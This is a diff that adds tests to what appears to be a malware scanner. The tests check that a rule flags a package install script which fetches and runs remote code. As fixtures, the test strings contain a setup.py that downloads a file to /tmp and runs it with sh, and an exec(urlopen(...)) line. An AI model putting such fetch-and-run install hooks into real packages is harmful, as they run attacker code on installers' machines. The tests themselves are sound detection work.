@@ -115,3 +115,42 @@ class TestTheRule:
     def test_the_same_in_a_test_file_is_not_reported(self, tmp_path: Path) -> None:
         init = f"import urllib.request\nexec(urllib.request.urlopen('{URL}').read())\n"
         assert FetchRunKit.RULE not in FetchRunKit.rules(tmp_path, init, name="test_boot.py")
+
+
+class TestTheInstallForm:
+    INSTALL_RULE = "MALWARE.INSTALL.FETCH_RUN.001"
+
+    @staticmethod
+    def rules(tmp_path: Path, setup: str) -> set[str]:
+        archive = tmp_path / "demo-1.0.tar.gz"
+        with tarfile.open(archive, "w:gz") as tgz:
+            for member, text in (
+                ("PKG-INFO", "Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n"),
+                ("setup.py", setup),
+                ("demo/__init__.py", "VERSION = '1.0'\n"),
+            ):
+                data = text.encode("utf-8")
+                info = tarfile.TarInfo(f"demo-1.0/{member}")
+                info.size = len(data)
+                tgz.addfile(info, io.BytesIO(data))
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
+        return {f.rule_id for f in result.findings}
+
+    def test_a_setup_script_that_fetches_and_runs_blocks(self, tmp_path: Path) -> None:
+        setup = (
+            "import os, urllib.request\n"
+            "from setuptools import setup\n"
+            f"urllib.request.urlretrieve('{URL}', '/tmp/s')\n"
+            "os.system('sh /tmp/s')\n"
+            "setup(name='demo', version='1.0')\n"
+        )
+        assert self.INSTALL_RULE in self.rules(tmp_path, setup)
+
+    def test_a_setup_script_that_only_reads_a_version_is_not_this(self, tmp_path: Path) -> None:
+        setup = (
+            "import subprocess\n"
+            "from setuptools import setup\n"
+            "rev = subprocess.check_output(['git', 'describe']).decode()\n"
+            "setup(name='demo', version='1.0')\n"
+        )
+        assert self.INSTALL_RULE not in self.rules(tmp_path, setup)
